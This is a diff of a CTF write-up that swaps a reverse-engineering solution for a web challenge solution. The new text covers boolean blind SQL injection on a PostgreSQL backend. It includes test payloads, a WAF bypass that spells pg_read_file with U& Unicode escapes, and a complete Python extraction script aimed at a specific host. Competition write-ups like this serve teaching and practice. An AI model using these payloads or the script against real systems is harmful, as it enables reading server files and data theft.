@@ -183,73 +183,165 @@ PTITCTF{uN1c0d3_35c4p3_p0stgr3s_b4d_t1m3_5ql1}
 
 <div class="lang-en" markdown="1">
 
-> **Flag:** `PTITCTF{m3g4l0v4n14_z3_s0lv3r_vm_byt3c0d3_r3v}`
+> **Flag:** `PTITCTF{uN1c0d3_35c4p3_p0stgr3s_b4d_t1m3_5ql1}`
 
-Featured in the **PTITCTF 2026 Finals (Reverse / Misc)**, `Megalovania` is an obfuscated binary running a custom VM that validates flag characters through complex algebraic polynomial constraints.
 
-The objective is to disassemble the custom bytecode instruction stream and solve the constraint system using the Z3 SMT solver.
+The challenge belongs to the **Web** category in the PTITCTF 2026 Finals. The challenge provides a web application that simulates the famous minigame *Bad Time Simulator* (Sans battle in Undertale) built with HTML5 Canvas and Construct 2, combined with a backend that handles death counters connecting to the PostgreSQL database.
+
+The goal is to exploit the play statistics endpoint to extract the content of the flag file `/flag.txt` stored on the database server.
 
 ---
 
-## Solve Flow
+## Solve Flow Diagram
 
 ```mermaid
 flowchart TD
-    A["Binary: megalovania"] --> B["Locate custom VM bytecode array in .rodata"]
-    B --> C["Reverse Disassembler: Decode 8 opcodes (ADD, XOR, MUL, MOD, ROL, CMP, JNZ)"]
-    C --> D["Extract 32 linear/polynomial constraint equations"]
-    D --> E["Model system of equations using Python Z3 Solver"]
-    E --> F["Add character range constraints (0x20 <= c <= 0x7E)"]
-    F --> G["Execute s.check() -> SAT"]
-    G --> H["Evaluate model -> Extract 36 ASCII characters"]
-    H --> I["Flag: PTITCTF{m3g4l0v4n14_z3_s0lv3r_vm_byt3c0d3_r3v}"]
+    A["Web interface: Bad Time Simulator (Sans Fight)"] --> B["Capture packets when Game Over: POST /count with body {'deaths': N}"]
+    B --> C["Testing SQL Injection: Test the Boolean Blind string on the deaths parameter"]
+    C --> D["WAF/Filter detection: Block sensitive keywords (pg_, read, file, pg_read_file...)"]
+    D --> E["Bypass PostgreSQL filter: Use Unicode escape syntax U&'pg\005fread\005ffile'"]
+    E --> F["Build Boolean Oracle: Based on presence of 'lines' array in JSON response"]
+    F --> G["Find Flag length: Binary Search Algorithm"]
+    G --> H["Extract individual characters: Binary Search ASCII code using substring() and ascii()"]
+    H --> I["Obtain Flag: PTITCTF{uN1c0d3_35c4p3_p0stgr3s_b4d_t1m3_5ql1}"]
 ```
 
 ---
 
-## Step 1: Reconstructing the Bytecode Instruction Set
+## Step 1: Survey the application and determine the code injection point (Injection Point)
 
-Analyzing the dispatch routine in IDA Pro reveals an accumulator-based virtual machine:
-* Opcode `0x10`: `MOV acc, imm`
-* Opcode `0x11`: `ADD acc, flag[i]`
-* Opcode `0x12`: `XOR acc, flag[i]`
-* Opcode `0x13`: `MUL acc, imm`
-* Opcode `0x14`: `MOD acc, imm`
-* Opcode `0x15`: `CMP acc, imm`
+When experiencing the game, every time the player loses blood and dies, the Construct 2 client will send an HTTP POST request to the backend API to update the data:
 
-We write a quick disassembler to extract the equations generated for each flag block.
+```http
+POST /count HTTP/1.1
+Host: 144.79.188.39:47004
+Content-Type: application/json
+
+{"deaths": 1}
+```
+
+The response from the server returns JSON containing information about the dialogue lines corresponding to the number of deaths of the player:
+
+```json
+{"lines": ["geez, you really like swinging that thing, huh?", "..."]}
+```
+
+When testing passing boolean values ​​to the `deaths` field:
+* Sending `{"deaths": "1 AND 1=1"}`: Server returns HTTP 200 with list of `lines`.
+* Sending `{"deaths": "1 AND 1=2"}`: Server returned HTTP 200 but `lines` list is empty `[]`.
+* Sending `{"deaths": "1' OR '1'='1"}`: SQL syntax error or returned null.
+
+This proves that the backend SQL query is directly concatenated without using Prepared Statements, taking the form:
+```sql
+SELECT ... FROM dialogue WHERE death_count = $deaths AND ...
+```
+Therefore, this is an integer-based **Boolean-based Blind SQL Injection** code injection point.
 
 ---
 
-## Step 2: Solving Constraints with Z3
+## Step 2: Analyze the filtering mechanism (WAF / Keyword Filter) and Bypass Technique
+
+When testing PostgreSQL's regular file reading payloads:
+* `(SELECT pg_read_file('/flag.txt'))` $\rightarrow$ The server immediately responded HTTP `403 Forbidden`.
+
+Proceed with fuzzing the keyword list to determine filter rules:
+* Functions and prefixes are completely blocked: `pg_`, `read`, `file`, `pg_read_file`, `pg_read_binary_file`, `lo_import`, `copy`.
+* Allowed auxiliary functions: `length()`, `substring()`, `ascii()`, `chr()`, `cast()`.
+
+### Unicode String Literal Technique in PostgreSQL
+PostgreSQL supports standard extended Unicode string syntax starting with `U&`:
+* Syntax: `U&"string\xxxx"` allows decoding Unicode characters according to the 4-digit hex code `\xxxx`.
+* The underline character `_` has the ASCII code in the Unicode code table as `\005f`.
+
+Therefore, the function name `pg_read_file` can be represented as: $$\text{U\&"pg\textbackslash005fread\textbackslash005ffile"}$$
+
+When PostgreSQL receives the query, the PostgreSQL lexer will resolve this escape sequence into the identifier `pg_read_file`. Meanwhile, the WAF filter at the application layer only checks the raw string so it cannot detect banned keywords.
+
+Check condition:
+```sql
+1 AND (length(U&"pg\005fread\005ffile"('/flag.txt')) > 0)
+```
+The result returns HTTP 200 and the `lines` array has the data $\rightarrow$ Bypass successful!
+
+---
+
+## Step 3: Build Boolean Oracle and Extract Flag
+
+Build an Oracle function that distinguishes True/False based on the length of the JSON response array:
+* **True**: HTTP status 200 and `len(json_data['lines']) > 0`.
+* **False**: HTTP status 200 and `len(json_data['lines']) == 0`.
+* **Blocked**: HTTP status 403 (need to adjust payload if WAF hits).
+
+### Data extraction algorithm:
+1. **String length detection**: Use binary search with condition `length(U&"pg\005fread\005ffile"('/flag.txt')) > mid` in the range $[1, 300]$.
+2. **Detect each character**: For each position $pos$ from $1$ to $length$:
+* Check `ascii(substring(U&"pg\005fread\005ffile"('/flag.txt'), pos, 1)) > mid` with binary search range $[0, 127]$. * After a maximum of 7 requests, determine the exact character at position $pos$.
+
+Automatic extraction script:
 
 ```python
-from z3 import *
+import urllib.request, json, sys
 
-s = Solver()
-flag = [BitVec(f'c_{i}', 32) for i in range(36)]
+BASE = 'http://144.79.188.39:47004'
 
-# Standard printable ASCII constraints
-for c in flag:
-    s.add(c >= 0x20, c <= 0x7E)
+def post(deaths):
+    body = json.dumps({'deaths': deaths}).encode()
+    req = urllib.request.Request(BASE + '/count', data=body, method='POST')
+    req.add_header('Content-Type', 'application/json')
+    try:
+        r = urllib.request.urlopen(req, timeout=15)
+        return r.status, r.read().decode('utf-8', 'replace')
+    except urllib.error.HTTPError as e:
+        return e.code, e.read().decode('utf-8', 'replace')
+    except Exception:
+        return -1, ''
 
-# Prefix PTITCTF{
-prefix = b"PTITCTF{"
-for i, b in enumerate(prefix):
-    s.add(flag[i] == b)
-s.add(flag[35] == ord('}'))
+def oracle(cond):
+    st, b = post(f"1 AND ({cond})")
+    if st == 403:
+        return None
+    try:
+        d = json.loads(b)
+        return len(d.get('lines', [])) > 0
+    except Exception:
+        return None
 
-# Add extracted VM polynomial constraints
-# ... equations added from disassembled bytecode ...
+F = 'U&"pg\\005fread\\005ffile"(\'/flag.txt\')'
 
-if s.check() == sat:
-    m = s.model()
-    recovered = bytes([m[c].as_long() for c in flag])
-    print("Recovered Flag:", recovered.decode())
+# 1. Tìm độ dài chuỗi flag
+lo, hi = 1, 300
+while lo < hi:
+    mid = (lo + hi) // 2
+    if oracle(f"length({F})>{mid}"):
+        lo = mid + 1
+    else:
+        hi = mid
+length = lo
+print(f"[*] Flag Length: {length}")
+
+# 2. Dò từng ký tự ASCII
+flag = ""
+for pos in range(1, length + 1):
+    lo, hi = 0, 127
+    while lo < hi:
+        mid = (lo + hi) // 2
+        if oracle(f"ascii(substring({F},{pos},1))>{mid}"):
+            lo = mid + 1
+        else:
+            hi = mid
+    flag += chr(lo)
+    print(f"[+] Pos {pos}: {chr(lo)!r} -> Current: {flag}")
+
+print(f"\n[SUCCESS] Flag: {flag}")
 ```
 
-Running the solver outputs the complete flag.
+Running the script is complete, the flag string is recreated intact.
 
-⇒ **Flag:** `PTITCTF{m3g4l0v4n14_z3_s0lv3r_vm_byt3c0d3_r3v}`
+---
 
+## Flag
+
+```text
+PTITCTF{uN1c0d3_35c4p3_p0stgr3s_b4d_t1m3_5ql1}
+```
 </div>
